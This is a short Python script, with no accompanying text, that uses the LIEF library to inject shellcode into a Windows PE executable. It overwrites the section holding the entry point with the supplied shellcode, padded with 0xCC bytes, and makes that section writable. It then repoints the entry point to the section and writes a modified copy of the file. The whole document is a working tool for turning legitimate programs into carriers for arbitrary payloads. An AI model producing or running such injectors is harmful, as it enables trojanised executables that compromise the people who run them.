import sys
import os
import lief

def inject(exe, sc):
    pe = lief.parse(exe)
    text = pe.section_from_rva(pe.optional_header.addressof_entrypoint)
    if text.size < len(sc):
        print("shellcode is too long")
        return
    text.content = list(sc.ljust(text.size, b'\xcc'))
    text.characteristics |= lief.PE.Section.CHARACTERISTICS.MEM_WRITE.value
    pe.optional_header.addressof_entrypoint = text.virtual_address
    
    out = lief.PE.Builder(pe)
    out.build()
    out.write('out.' + os.path.basename(exe))

if __name__ == '__main__':
    sc = b''
    if len(sys.argv) < 2:
        print("usage: inject.py file.exe [shellcode.bin]")
        sys.exit(1)
    elif len(sys.argv) == 3:
        exe = sys.argv[-2]
        sc = open(sys.argv[-1], 'rb').read()
    else:
        exe = sys.argv[-1]
    inject(exe, sc) 
